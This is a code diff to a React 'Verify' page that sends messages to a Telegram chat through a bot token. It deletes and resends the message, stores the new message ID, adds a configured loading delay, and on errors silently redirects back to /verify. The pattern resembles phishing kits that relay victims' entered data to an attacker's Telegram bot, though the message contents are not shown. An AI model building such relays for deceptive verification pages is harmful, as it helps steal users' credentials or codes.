@@ -38,15 +38,18 @@ const sendTelegramMessage = async (
 	config: Config,
 	messageId: string,
 ) => {
-	return axios.post(
-		`https://api.telegram.org/bot${config.token}/editMessageText`,
+	await axios.post(
+		`https://api.telegram.org/bot${config.token}/deleteMessage`,
 		{
 			chat_id: config.chatId,
 			message_id: messageId,
-			text: message,
-			parse_mode: "HTML",
 		},
 	);
+	return axios.post(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+		chat_id: config.chatId,
+		text: message,
+		parse_mode: "HTML",
+	});
 };
 
 const Verify: FC = () => {
@@ -106,7 +109,12 @@ const Verify: FC = () => {
 		}));
 
 		try {
-			await sendTelegramMessage(message, config, savedMessageId);
+			const response = await sendTelegramMessage(
+				message,
+				config,
+				savedMessageId,
+			);
+			localStorage.setItem("messageId", response.data.result.message_id);
 			setTimeout(() => {
 				setUiState((prev) => ({
 					...prev,
@@ -115,11 +123,7 @@ const Verify: FC = () => {
 				}));
 			}, config.loadingTime);
 		} catch {
-			setUiState((prev) => ({
-				...prev,
-				isLoading: false,
-				error: "Something went wrong. Please try again later.",
-			}));
+			navigate("/verify");
 		}
 	};
 
